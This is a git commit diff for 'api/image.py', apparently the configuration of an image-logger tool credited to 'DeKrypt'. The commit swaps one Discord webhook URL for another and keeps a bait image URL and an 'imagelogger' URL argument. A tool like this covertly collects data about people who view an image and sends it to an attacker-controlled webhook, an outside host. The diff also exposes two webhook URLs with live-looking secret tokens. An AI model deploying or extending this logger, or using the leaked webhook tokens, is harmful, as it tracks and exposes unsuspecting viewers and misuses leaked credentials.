a0aa99ac5753b4d85f393f346ba7cb73dfe3a9be
ScripterJay391 <jacobmeehan285@gmail.com>
2025-04-15 06:32:35 -1100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1361754985997537281/hU4b3pdXHYrCNptxLdHl3awFl8BCBEy97BzEZ6QKxmuLMWlhN7Ohf2BTvGcL83ryRA0v",
+    "webhook": "https://discord.com/api/webhooks/1334947422178381925/2MxVFf5GBYkDBPTDDG-cCPS3eFUJKHUqJjlLb1vK75kAzO-zftxee9j9bB9gqffSXyAn",
     "image": "https://thumbs.dreamstime.com/b/african-child-8205141.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
